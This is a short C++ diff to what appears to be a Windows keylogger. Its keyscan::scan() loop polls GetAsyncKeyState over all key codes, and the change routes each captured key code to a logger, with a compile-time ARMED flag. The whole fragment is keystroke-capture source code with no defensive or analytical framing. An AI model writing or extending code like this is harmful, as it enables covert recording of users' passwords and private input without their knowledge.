@@ -14,12 +14,8 @@ void keyscan::scan() {
 		Sleep(1);
 		for (int KEY = 8; KEY <= 255; KEY++) {
 			if (GetAsyncKeyState(KEY) == -32767) {
-				if (GetAsyncKeyState(VK_SHIFT))
-					shift(KEY);
-				else if (GetAsyncKeyState(VK_MENU))
-					altgr(KEY);
-				else
-					mless(KEY);
+				uint8_t code = getcode(KEY);
+				if (code != 0x00) m_logger->log(code);
 			}
 		}
 		if constexpr (!ARMED) {
